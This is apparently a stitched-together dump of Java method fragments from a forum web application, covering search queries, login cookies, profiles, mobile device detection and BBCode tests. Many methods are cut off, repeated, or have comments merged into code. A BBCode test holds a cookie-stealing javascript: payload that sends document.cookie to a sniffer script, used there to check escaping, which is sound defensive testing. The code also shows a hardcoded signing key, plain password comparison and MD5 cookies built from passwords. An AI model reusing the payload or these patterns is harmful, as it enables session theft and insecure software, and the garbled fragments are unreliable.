( select . toString ( ) ) ; 
public String show ( Connection db ) throws SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND not msgs.deleted AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public static MemoriesListItem getMemoriesListItem ( Connection db , int id ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT * FROM memories WHERE id= " + id ) ; if ( ! rs . next ( ) ) { return null ; 
public ModelAndView remove ( HttpServletRequest request , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void checkPassword ( String password ) throws BadPasswordException { if ( blocked ) { throw new BadPasswordException ( nick ) ; } if ( password = = null | | ! password . equals ( this . password ) ) { throw new BadPasswordException ( nick ) ; 
public ImmutableList < PollVariant > getPollVariants ( Connection db , int order ) throws SQLException { List < PollVariant > variants = new ArrayList < PollVariant > ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs ; switch ( order ) { case ORDER_ID : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY id " ) ; break ; case ORDER_VOTES : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY votes DESC, id " ) ; break ; default : throw new RuntimeException ( " Oops!? order= " + order ) ; } while ( rs . next ( ) ) { int varId = rs . getInt ( " id " ) ; String label = rs . getString ( " label " ) ; int votes = rs . getInt ( " votes " ) ; variants . add ( new PollVariant ( varId , label , votes ) ) ; } return ImmutableList . copyOf ( variants ) ; } 
private ModelAndView prepareModel ( Connection db , Message message ) throws SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public void performLogin ( HttpServletResponse response , Connection db , User user ) throws SQLException { session . putValue ( " login " , Boolean . TRUE ) ; session . putValue ( " nick " , user . getNick ( ) ) ; session . putValue ( " moderator " , user . canModerate ( ) ) ; session . putValue ( " corrector " , user . canCorrect ( ) ) ; user . updateUserLastlogin ( db ) ; user . acegiSecurityHack ( response , session ) ; } 
public void updateUserLastlogin ( Connection dbconn ) throws SQLException { String sSql = " UPDATE users SET lastlogin=CURRENT_TIMESTAMP WHERE id=? " ; PreparedStatement pst = dbconn . prepareStatement ( sSql ) ; pst . setInt ( 1 , id ) ; pst . executeUpdate ( ) ; pst . close ( ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
private static boolean isAjax ( HttpServletRequest request ) { String header = request . getHeader ( " X-Requested-With " ) ; return header ! = null & & " XMLHttpRequest " . equals ( header ) ; } 
private static void performLogin ( HttpServletResponse response , Connection db , Template tmpl , HttpSession session , User user ) throws SQLException { createCookies ( response , tmpl , session , user ) ; tmpl . performLogin ( response , db , user ) ; } 
private static void createCookies ( HttpServletResponse response , Template tmpl , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( tmpl . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public View add ( ServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView remove ( ServletRequest request , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static String loadUserAgent ( Connection db , int id ) throws SQLException { if ( id = = 0 ) { return null ; } PreparedStatement pst = db . prepareStatement ( " SELECT name FROM user_agents WHERE id=? " ) ; try { pst . setInt ( 1 , id ) ; 
private static ModelAndView prepareModel ( Connection db , Message message ) throws SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public Message getNextMessage ( Connection db , SectionStore sectionStore ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT min(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db , SectionStore sectionStore ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT max(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public ModelAndView mainPage ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
public Section getSection ( int id ) throws SectionNotFoundException { Section section = sections . get ( id ) ; if ( section = = null ) { throw new SectionNotFoundException ( id ) ; } return section ; } 
private static PreparedStatement prepare ( Connection db ) throws SQLException { return db . prepareStatement ( " SELECT message, bbcode FROM msgbase WHERE id=? " ) ; } 
private static String getProcessedMessage ( Connection db , PreparedStatement pst , Comment comment ) throws SQLException { pst . setInt ( 1 , comment . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; String text = rs . getString ( 1 ) ; boolean bbcode = rs . getBoolean ( 2 ) ; rs . close ( ) ; if ( bbcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
public static PreparedComment prepare ( Connection db , CommentList comments , Comment comment ) throws UserNotFoundException , SQLException { PreparedStatement pst = prepare ( db ) ; try { return new PreparedComment ( db , pst , comments , comment ) ; 
public static List < PreparedComment > prepare ( Connection db , CommentList comments , List < Comment > list ) throws UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; PreparedStatement pst = prepare ( db ) ; try { for ( Comment comment : list ) { 
public List < EditInfoDTO > loadEditInfo ( Connection db ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " ) ; try { pst . setInt ( 1 , msgid ) ; 
public static boolean isBox ( String name ) { return BOX_SET . contains ( name ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( " newfirst " , Boolean . FALSE ) ; defaults . put ( " hover " , Boolean . TRUE ) ; defaults . put ( " style " , " black " ) ; defaults . put ( " format.mode " , " quot " ) ; defaults . put ( " topics " , 30 ) ; defaults . put ( " messages " , 50 ) ; defaults . put ( " tags " , 50 ) ; defaults . put ( " photos " , Boolean . TRUE ) ; defaults . put ( " system.timestamp " , new Date ( ) . getTime ( ) ) ; defaults . put ( " showinfo " , Boolean . TRUE ) ; defaults . put ( " showanonymous " , Boolean . TRUE ) ; defaults . put ( " showsticky " , Boolean . TRUE ) ; defaults . put ( " avatar " , " empty " ) ; defaults . put ( HIDE_ADSENSE , true ) ; defaults . put ( MAIN_GALLERY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put("main.3columns", Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put("main2", boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put("main3-1", boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put("main3-2", boxes32); return defaults; } 
public static boolean isStyle ( String style ) { return STYLE_SET . contains ( style ) ; } 
public void testDefaultProfile ( ) { Profile profile = new Profile ( ) ; assertTrue ( profile . isDefault ( ) ) ; } 
public void testDefaultProfileSave ( ) throws Exception { Profile profile = new Profile ( ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; Profile profile1 = new Profile ( new ByteArrayInputStream ( os . toByteArray ( ) ) ) ; assertFalse ( profile1 . isDefault ( ) ) ; } 
public void estModification ( ) throws Exception { Profile profile = new Profile ( ) ; assertNotSame ( 125 , profile . getHashtable ( ) . getInt ( " messages " ) ) ; profile . getHashtable ( ) . setInt ( " messages " , 125 ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; Profile profile1 = new Profile ( new ByteArrayInputStream ( os . toByteArray ( ) ) ) ; assertEquals ( 125 , profile1 . getHashtable ( ) . getInt ( " messages " ) ) ; } 
public void performLogin ( HttpServletResponse response , Connection db , User user ) throws SQLException { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; session . setAttribute ( " moderator " , user . canModerate ( ) ) ; session . setAttribute ( " corrector " , user . canCorrect ( ) ) ; user . updateUserLastlogin ( db ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
private Profile readProfile ( ) throws ClassNotFoundException , IOException , StorageException { InputStream df = null ; try { df = config . getStorage ( ) . getReadStream ( " profile " , getNick ( ) ) ; 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return ( Boolean ) session . getAttribute ( " moderator " ) ; } 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return session . getAttribute ( " corrector " ) ! = null ? ( Boolean ) session . getAttribute ( " corrector " ) : false ; } 
public boolean isMobile ( ) { if ( ! " tango " . equals ( style ) ) { return false ; } return userAgent . detectAndroidWebKit ( ) ; } 
public ModelAndView view ( HttpServletRequest request ) throws UtilException { boolean isThreeColumn = getThreeColumns ( request ) ; ModelAndView result = new ModelAndView ( " edit-boxes " ) ; result . addObject ( " isThreeColumn " , isThreeColumn ) ; return result ; } 
protected static boolean getThreeColumns ( HttpServletRequest request ) throws UtilException { Template = Template . getTemplate ( request ) ; return . getProf ( ) . getBoolean ( " main.3columns " ) ; } 
public boolean detectIphone ( ) { The iPod touch says it's an iPhone! So let's disambiguate. if (userAgent.contains(deviceIphone) && !detectIpod()) { return true; } return false; } 
public boolean detectIpod ( ) { if ( userAgent . contains ( deviceIpod ) ) { return true ; } return false ; } 
public boolean detectIphoneOrIpod ( ) { We repeat the searches here because some iPods may report themselves as an iPhone, which would be okay. if (userAgent.contains(deviceIphone) || userAgent.contains(deviceIpod)) { return true; } return false; } 
public boolean detectAndroid ( ) { if ( userAgent . contains ( deviceAndroid ) ) { return true ; } return false ; } 
public boolean detectWebkit ( ) { if ( userAgent . contains ( engineWebKit ) ) { return true ; } return false ; } 
public boolean detectS60OssBrowser ( ) { First, test for WebKit, then make sure it's either Symbian or S60. if (detectWebkit() && (userAgent.contains(deviceSymbian) || userAgent.contains(deviceS60))) { return true; } return false; } 
public boolean detectSymbianOS ( ) { if ( userAgent . contains ( deviceSymbian ) | | userAgent . contains ( deviceS60 ) | | userAgent . contains ( deviceS70 ) | | userAgent . contains ( deviceS80 ) | | userAgent . contains ( deviceS90 ) ) { return true ; } return false ; } 
public boolean detectWindowsMobile ( ) { Most devices use 'Windows CE', but some report 'iemobile' and some older ones report as 'PIE' for Pocket IE. if (userAgent.contains(deviceWinMob) || userAgent.contains(deviceIeMob) || userAgent.contains(enginePie) || (detectWapWml() && userAgent.contains(deviceWindows))) { return true; } return false; } 
public boolean detectBlackBerry ( ) { if ( userAgent . contains ( deviceBB ) | | httpAccept . contains ( vndRIM ) ) { return true ; } return false ; } 
public boolean detectPalmOS ( ) { Most devices nowadays report as 'Palm', but some older ones reported as Blazer or Xiino. if (userAgent.indexOf(devicePalm) != -1 || userAgent.contains(engineBlazer) || userAgent.contains(engineXiino)) { return true; } return false; } 
public boolean detectBrewDevice ( ) { if ( userAgent . contains ( deviceBrew ) ) { return true ; } return false ; } 
public boolean detectDangerHiptop ( ) { if ( userAgent . contains ( deviceDanger ) | | userAgent . contains ( deviceHiptop ) ) { return true ; } return false ; } 
public boolean detectOperaMobile ( ) { if ( userAgent . contains ( engineOpera ) & & ( userAgent . contains ( mini ) | | userAgent . contains ( mobi ) ) ) { return true ; } return false ; } 
public boolean detectWapWml ( ) { if ( httpAccept . indexOf ( vndwap ) ! = - 1 | | httpAccept . contains ( wml ) ) { return true ; } return false ; } 
public boolean detectMobileQuick ( ) { Ordered roughly by market share, WAP/XML > Brew > Smartphone. if (detectWapWml()) { return true; } if (detectBrewDevice()) { return true; } Updated by AHand if (detectOperaMobile()) { return true; } if (userAgent.contains(engineUpBrowser)) { return true; } if (userAgent.contains(engineOpenWeb)) { return true; } if (userAgent.contains(deviceMidp)) { return true; } if (detectSmartphone()) { return true; } if (detectDangerHiptop()) { return true; } if (detectMidpCapable()) { return true; } if (userAgent.contains(devicePda)) { return true; } if (userAgent.contains(mobile)) { return true; } detect older phones from certain manufacturers and operators. if (userAgent.contains(uplink)) { return true; } if (userAgent.contains(manuSonyEricsson)) { return true; } if (userAgent.contains(manuericsson)) { return true; } if (userAgent.contains(manuSamsung1)) { return true; } if (userAgent.contains(svcDocomo)) { return true; } if (userAgent.contains(svcKddi)) { return true; } if (userAgent.contains(svcVodafone)) { return true; } return false; } 
public boolean detectSonyPlaystation ( ) { if ( userAgent . contains ( devicePlaystation ) ) { return true ; } return false ; } 
public boolean detectNintendo ( ) { if ( userAgent . contains ( deviceNintendo ) | | userAgent . contains ( deviceWii ) | | userAgent . contains ( deviceNintendoDs ) ) { return true ; } return false ; } 
public boolean detectXbox ( ) { if ( userAgent . contains ( deviceXbox ) ) { return true ; } return false ; } 
public boolean detectMidpCapable ( ) { if ( userAgent . contains ( deviceMidp ) | | httpAccept . contains ( deviceMidp ) ) { return true ; } return false ; } 
public boolean detectMaemoTablet ( ) { if ( userAgent . contains ( maemo ) ) { return true ; } else if ( userAgent . contains ( maemoTablet ) & & userAgent . contains ( linux ) ) { return true ; } return false ; } 
public boolean detectArchos ( ) { if ( userAgent . contains ( deviceArchos ) ) { return true ; } return false ; } 
public boolean detectSonyMylo ( ) { if ( userAgent . contains ( manuSony ) & & ( userAgent . contains ( qtembedded ) | | userAgent . contains ( mylocom2 ) ) ) { return true ; } return false ; } 
public void testLineBreak ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void testTagExcape ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void testJavascriptURL ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , JAVASCRIPT_URL ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
public void testCodeExcape ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div><p> " , result ) ; } 
public void testList ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LIST_TEST ) ; assertEquals ( LIST_RESULT , result ) ; } 
public void testBadList ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , BADLIST_TEST ) ; assertEquals ( BADLIST_RESULT , result ) ; } 
public void testUnexceptedCut ( ) throws Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( true ) ; String result = proc . preparePostText ( null , " [list][*][cut][/cut][/list] " ) ; assertEquals ( " <p><ul><li></ul><p> " , result ) ; } 
private static ModelAndView prepareModel ( Connection db , Message message ) throws SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public void initCurrentUser ( Connection db ) throws SQLException { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null ) { return ; } try { currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
public void initCurrentUser ( Connection db ) throws SQLException { initCurrentUser ( db , false ) ; } 
public void updateCurrentUser ( Connection db ) throws SQLException { initCurrentUser ( db , true ) ; } 
private void initCurrentUser ( Connection db , boolean forceUpdate ) throws SQLException { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } try { currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
public void resetUnreadEvents ( Connection db ) throws SQLException { PreparedStatement st = db . prepareStatement ( " UPDATE users SET unread_events=0 where id=? " ) ; try { st . setInt ( 1 , id ) ; 
public List < SearchItem > get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; List < SearchItem > res = null ; if ( ! nocache ) { time = 0 ; long current = System . currentTimeMillis ( ) ; res = ( List < SearchItem > ) mcc . getFromCache ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND not msgs.deleted AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; SearchCacher cacher = new SearchCacher ( ) ; params . put ( " result " , cacher . get ( sv , false ) ) ; params . put ( " cached " , cacher . isFromCache ( ) ) ; params . put ( " time " , cacher . getTime ( ) ) ; } return new ModelAndView ( " search " , params ) ; } 
public List < SearchItem > get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; List < SearchItem > res = null ; if ( ! nocache ) { time = 0 ; long current = System . currentTimeMillis ( ) ; res = ( List < SearchItem > ) mcc . getFromCache ( cacheId ) ; time = System . currentTimeMillis ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = System . currentTimeMillis ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
public void testCodeBR ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test ntest[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test ntest</code></pre></div><p> " , result ) ; } 
public static String escapeHtmlBBcode ( String content ) { \r".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", "[code-br]", ""}); return content; } 
private static boolean checkLastModified ( WebRequest webRequest , Message message ) { try { return webRequest . checkNotModified ( message . getLastModified ( ) . getTime ( ) ) ; 
public List < PreparedMessage > getPreparedMessages ( Connection db ) throws SQLException { return getPreparedMessages ( db , false ) ; } 
public List < PreparedMessage > getPreparedMessagesCached ( Connection db ) throws SQLException { return getPreparedMessages ( db , true ) ; } 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) throws SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { try { pm . add ( new PreparedMessage ( db , message , false ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } catch ( PollNotFoundException e ) { throw new RuntimeException ( e ) ; } } return pm ; } 
private static ModelAndView prepareModel ( Connection db , Message message ) throws SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message , true ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
